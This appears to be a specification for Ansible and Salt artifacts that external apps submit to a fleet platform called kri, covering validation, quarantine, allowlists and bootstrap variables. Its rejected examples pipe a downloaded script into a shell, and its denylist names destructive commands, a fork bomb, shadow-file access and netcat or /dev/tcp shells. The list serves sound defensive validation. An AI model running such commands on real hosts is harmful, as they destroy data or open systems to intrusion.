# kri Platform Contract — Ansible & Salt Artifacts

- **Contract version:** `1.0.0`
- **Status:** Normative
- **Audience:** Third-party / external applications that generate Ansible playbooks or
  Salt states intended to be consumed by a kri fleet platform (authoring, intake,
  promotion, and runtime execution).
- **Machine-readable companions:**
  - [`contract/contract.json`](./contract/contract.json) — every rule below as data (limits, forbidden lists, dangerous-pattern regexes, allowlists, bootstrap vars).
  - [`contract/ansible-playbook.schema.json`](./contract/ansible-playbook.schema.json) — JSON Schema for the *parsed* playbook structure.
  - [`contract/salt-state.schema.json`](./contract/salt-state.schema.json) — JSON Schema for the *parsed* salt-state structure.

> **Source of truth.** This document mirrors the behaviour of
> `fleet_platform/services/artifact_validation.py` and the runtime/intake code paths
> referenced throughout. Where this document and the running validator disagree, **the
> validator wins** — file a bug against this contract. The JSON manifest and schemas are
> kept consistent with the validator and are versioned with `CONTRACT_VERSION`.

The key words **MUST**, **MUST NOT**, **REQUIRED**, **SHOULD**, **SHOULD NOT**, and
**MAY** are to be interpreted as described in RFC 2119.

---

## 1. Scope & terminology

| Term | Meaning |
| --- | --- |
| **Artifact** | A single Ansible playbook (`.yml`) or Salt state (`.sls`) document produced by an external app. |
| **Intake** | The path by which an artifact enters kri: it is validated, then written to a per-session **quarantine** directory. |
| **Promotion** | An admin-gated step that copies a quarantined artifact into the live playbook tree. |
| **Compliant artifact** | An artifact that passes `validate_artifact(content, kind)` **and** the structural JSON Schema for its kind. |

Two `kind` values are recognised: **`ansible_playbook`** and **`salt_state`**. No other
kinds are accepted at intake.

> **Important distinction.** Platform-owned files shipped *inside* kri (e.g.
> `playbooks/bootstrap_node.yml`, `salt/states/base/*.sls`) are **not** run through
> `validate_artifact` and intentionally use constructs this contract forbids (e.g.
> `raw:`, `cmd.run`). This contract governs **externally supplied artifacts**, which are
> held to the stricter intake rules.

---

## 2. Universal rules (both kinds)

An artifact **MUST** satisfy all of the following regardless of kind:

1. **Size.** The UTF-8 encoded body **MUST** be ≤ **65536 bytes** (64 KiB).
2. **Parseable YAML.** The body **MUST** parse under `yaml.safe_load`. Anchors/aliases are
   permitted; YAML tags requiring `yaml.load` (e.g. `!!python/object`) **MUST NOT** be used.
3. **No dangerous patterns.** The raw text **MUST NOT** match any pattern in §5. A match is a
   hard failure (`valid = false`).
4. **Encoding.** UTF-8, no NUL bytes.

### 2.1 Filename rules (intake)

When an artifact is submitted for intake, its filename **MUST**:

- match `^[A-Za-z0-9._@-]+$`,
- be ≤ **255** characters,
- not be `.` or `..`,
- contain no `/` or `\\` and no NUL,
- not end in `.meta.json` (reserved for kri's metadata sidecar).

The `filename` field passed to the authoring API **MUST** be ≤ **128** characters; the
`content` field **MUST** be ≤ 65536 characters.

### 2.2 Quotas & lifetime (intake)

Quarantine is bounded; external apps **MUST** tolerate rejection when a quota is hit:

| Limit | Value |
| --- | --- |
| Per-artifact | 64 KiB |
| Per-session total | 5 MiB |
| Per-user total | 50 MiB |
| Retention (TTL) | 24 h (a sweeper deletes older sessions) |

Quarantined artifacts are **ephemeral**. An external app **MUST NOT** assume a quarantined
artifact persists beyond 24 h or survives promotion.

---

## 3. Ansible playbook contract (`kind: ansible_playbook`)

A compliant playbook **MUST**:

1. Parse to a **YAML list** (a list of plays). A mapping, scalar, or null at top level is rejected.
2. Have every list element be a **mapping** (play).
3. Use **only permitted modules** — it **MUST NOT** use any of:
   `raw`, `ansible.builtin.raw`, `script`, `ansible.builtin.script`.
   (These allow unconstrained command execution.) Module names are scanned recursively
   through `tasks`, `block`, `rescue`, and `always`.

A compliant playbook **SHOULD**:

- Declare `hosts:` (or `import_playbook:`) on every play. A missing `hosts`/`import_playbook`
  is **warning-level** in `validate_artifact` but is treated as an error by the lighter
  `lint_artifact` check and by some UI runners — so always set it.
- Target the inventory group **`targets`** (kri writes the runtime inventory under
  `[targets]`; `[all:children]` includes it, so `hosts: all` also resolves). Prefer
  `hosts: targets`.
- Set `become: true` when tasks require privilege (kri's bootstrap path uses `sudo`).
- Prefer fully-qualified collection names (FQCN) for builtin modules (e.g.
  `ansible.builtin.package`) for forward-compatibility.

### 3.1 Minimal compliant playbook

```yaml
- name: Install and enable nginx           # surfaced as the playbook name in the UI
  hosts: targets                           # REQUIRED in practice
  become: true
  gather_facts: true
  # Description: Installs nginx and ensures the service is running.
  vars:
    nginx_pkg: nginx
    _kri_var_descriptions:                 # optional; drives per-var help text in the UI
      nginx_pkg: "Package name to install"
  tasks:
    - name: Install package
      ansible.builtin.package:
        name: "{{ nginx_pkg }}"
        state: present
    - name: Enable & start service
      ansible.builtin.service:
        name: nginx
        state: started
        enabled: true
```

### 3.2 Non-compliant examples (rejected)

```yaml
# REJECTED: top level is a mapping, not a list of plays
hosts: all
tasks: []
```

```yaml
# REJECTED: forbidden module `raw`
- hosts: targets
  tasks:
    - raw: curl https://example.com/install.sh | sh   # also a dangerous pattern
```

---

## 4. Salt state contract (`kind: salt_state`)

A compliant state **MUST**:

1. Parse to a **YAML mapping** (state-id → declaration). A list or scalar at top level is rejected.
2. Have every declaration body be a mapping (a non-mapping body is **warning-level**, but
   external apps **SHOULD** always use mappings).
3. **MUST NOT** use any of these execution functions anywhere in the document:
   `cmd.run`, `cmd.shell`, `cmd.powershell`.

The `include` key is permitted and skipped by validation.

A compliant state **SHOULD** use declarative state modules (`pkg.*`, `file.*`, `service.*`,
`user.*`, etc.) rather than imperative shell-outs.

### 4.1 Minimal compliant state

```yaml
install_nginx:
  pkg.installed:
    - name: nginx

nginx_running:
  service.running:
    - name: nginx
    - enable: true
    - require:
      - pkg: install_nginx
```

### 4.2 Non-compliant example (rejected)

```yaml
# REJECTED: forbidden function cmd.run
provision:
  cmd.run:
    - name: curl https://example.com/x.sh | sh
```

> **Promotion gap (read this).** Today kri can promote **playbooks only** into the live tree.
> Salt-state artifacts can be quarantined, validated, and diffed, but there is **no
> first-class promote API for `salt/states/`**. Deploying salt states to the live
> `SALT_STATES_DIR` remains an out-of-band step (git / mount / sync). External apps
> **MUST NOT** assume a salt-state artifact will auto-deploy.

---

## 5. Dangerous-pattern denylist (both kinds)

A match of **any** of these against the raw artifact text is a hard rejection. The
regexes are reproduced in [`contract/contract.json`](./contract/contract.json).

| Label | Intent |
| --- | --- |
| recursive root/home delete | `rm -rf /`, `/*`, `~`, `$HOME` |
| fork bomb | `:(){ :|:& };:` |
| dd to block device | `dd ... of=/dev/sd|nvme|disk|rdisk|hd` |
| pipe-to-shell remote exec | `curl/wget … | (sudo) sh/bash` |
| filesystem/device overwrite | `mkfs.*`, `> /dev/sd` |
| world-writable root | `chmod -R 777 /` |
| TLS verification bypass | `--no-check-certificate`, `validate_certs: no/false`, `verify=False`, `insecure_skip_verify` |
| sensitive system file access | `/etc/shadow`, `/etc/sudoers` |
| raw network egress/listener | `0.0.0.0/0`, `nc -l`, `ncat -l`, `/dev/tcp/` |

External apps **MUST** treat these as permanently forbidden; they are not configurable.

---

## 6. Salt execution allowlist (commands kri will dispatch)

If an external app drives kri's Salt command API (rather than authoring a state file), the
requested function **MUST** be in the platform allowlist. The default allowlist is:

```
state.apply state.highstate state.show_sls
pkg.install pkg.remove pkg.list_pkgs pkg.upgrade
pip.install pip.installed pip.list
service.start service.stop service.restart service.disable service.enable
service.status service.get_all service.available service.enabled
disk.usage disk.inodeusage status.loadavg status.meminfo
grains.items grains.get test.ping test.version
saltutil.sync_all saltutil.refresh_grains saltutil.refresh_pillar
system.reboot ps.list_processes ps.kill_pid
```

- **`cmd.run` is permanently excluded** at both the platform allowlist and the salt-master
  ACL (operator-level RCE). It is not addable.
- Admins **MAY** extend the allowlist via platform settings; a deny list **MAY** subtract,
  but `test.ping`, `grains.items`, `grains.get` are always present.
- State names accepted by the salt API **MUST** match `^[a-zA-Z0-9_][a-zA-Z0-9_.-]*$`
  (dotted identifiers, e.g. `base.heartbeat`; no slashes, no globs).
- Reading the grains keys `master` and `pillar` via command tooling is **forbidden**.

---

## 7. Node bootstrap contract

An external app **MAY** ship a bootstrap-style playbook, but kri's own
`playbooks/bootstrap_node.yml` is the reference. A bootstrap playbook is invoked with the
inventory group `targets` and receives the following **runtime extravars injected by kri**
(an external playbook consuming this flow **MUST** read them, never hardcode them):

| Variable | Meaning |
| --- | --- |
| `salt_masters` | List of master addresses (HA failover). |
| `salt_master_address` | First master (back-compat alias). |
| `minion_id` | Node minion id (validated `^[a-zA-Z0-9._-]{1,128}$`). |
| `controller_pubkey` | Controller SSH public key to authorize. |
| `ingest_url` | `http://<first-master>/api/v1/ingest` base. |
| `node_token` | Per-run bearer token; sent as `X-Node-Token` on ingest. |
| `node_exporter_version` / `node_exporter_listen_address` / `node_exporter_url_override` | Optional telemetry overrides. |
| `ansible_ssh_pass` / `ansible_become_password` | Present only for password auth; in-memory only. |

**Expected end-state** of a compliant bootstrap:

1. Install the pinned `salt-minion` (`salt_version` from `group_vars`).
2. Write `/etc/salt/minion` with `master: [salt_masters]`, `master_type: failover`,
   `id: {{ minion_id }}`.
3. Start the minion (launchd/systemd).
4. Authorize `controller_pubkey` for SSH.
5. Install required node dependencies + `node_exporter` telemetry.
6. POST initial grains to `{{ ingest_url }}/grains` with header `X-Node-Token: {{ node_token }}`.

---

## 8. Platform API surface (what external apps consume)

| Capability | Endpoint | Status |
| --- | --- | --- |
| Validate an artifact for compliance | `POST /api/v1/contract/validate` | **PROPOSED — not yet exposed** (see §8.1) |
| Bootstrap a node | `POST /api/v1/ansible/bootstrap` | Available (operator+) |
| Ingest node grains | `POST /api/v1/ingest/grains` (`X-Node-Token`) | Available |
| Discover playbooks | `GET /api/v1/playbooks` | Available |
| Run a playbook | `POST /api/v1/playbooks/run` | Available (operator+) |
| Apply a salt state | `POST /api/v1/salt/apply` (`test:` for dry-run) | Available (operator+) |
| Promote a quarantined **playbook** | `POST /api/v1/agent/artifacts/{session}/{file}/promote` | Available (**admin only**) |

### 8.1 Required exposure for full external compliance

There is currently **no public endpoint** that runs `validate_artifact` — it is reachable
only via the agent's internal tools. For external apps to self-check compliance *before*
submission, kri **SHOULD** expose a stateless validation endpoint, e.g.:

```
POST /api/v1/contract/validate
{ "kind": "ansible_playbook" | "salt_state", "content": "<yaml>" }
→ 200 { "contract_version": "1.0.0", "valid": bool, "errors": [...], "warnings": [...] }
```

This endpoint is the normative compliance gate for external apps and is tracked as a
follow-up. Until it exists, external apps **MUST** vendor the rules from
[`contract/contract.json`](./contract/contract.json) and replicate the checks locally.

---

## 9. Versioning & compatibility

- This contract is versioned as `CONTRACT_VERSION` (semver) in
  [`contract/contract.json`](./contract/contract.json).
- **MAJOR** bumps are breaking (a previously-compliant artifact may now be rejected).
- **MINOR** bumps add rules/fields in a backward-compatible way (e.g. a new optional metadata key).
- **PATCH** bumps are clarifications/typos with no behavioural change.
- External apps **SHOULD** record the `contract_version` they targeted and re-validate on bumps.

---

## 10. Compliance checklist

An artifact is compliant when **all** of the following hold:

- [ ] Body ≤ 64 KiB, valid UTF-8, parses under `yaml.safe_load`.
- [ ] Correct top-level shape (Ansible = list of plays; Salt = mapping of state-ids).
- [ ] No forbidden module (Ansible) / function (Salt).
- [ ] No dangerous-pattern match (§5).
- [ ] Filename matches `^[A-Za-z0-9._@-]+$`, ≤ 255, not `*.meta.json`.
- [ ] (Ansible) every play sets `hosts:`/`import_playbook:`; prefer `targets`.
- [ ] (Salt) declarative modules only; aware that salt promotion is not yet automated.
- [ ] If driving the Salt command API: function ∈ allowlist (§6), state name matches the regex.
- [ ] If bootstrap: reads kri-injected runtime vars (§7), never hardcodes master/token.

---

## 11. References (source of truth in the kri repo)

| Concern | File |
| --- | --- |
| Validation rules & constants | `fleet_platform/services/artifact_validation.py` |
| Quarantine intake, filename/quota rules | `fleet_platform/services/agent_quarantine.py` |
| Promotion (playbook-only) | `fleet_platform/api/routes/agent.py` |
| Salt allowlist | `fleet_platform/services/platform_settings_svc.py` |
| Agent read-only salt subset & forbidden grains | `fleet_platform/agent/tools.py` |
| Bootstrap runtime vars & end-state | `fleet_platform/workers/ansible_tasks.py`, `playbooks/bootstrap_node.yml` |
| Playbook discovery / UI metadata | `fleet_platform/services/playbook_discovery.py` |
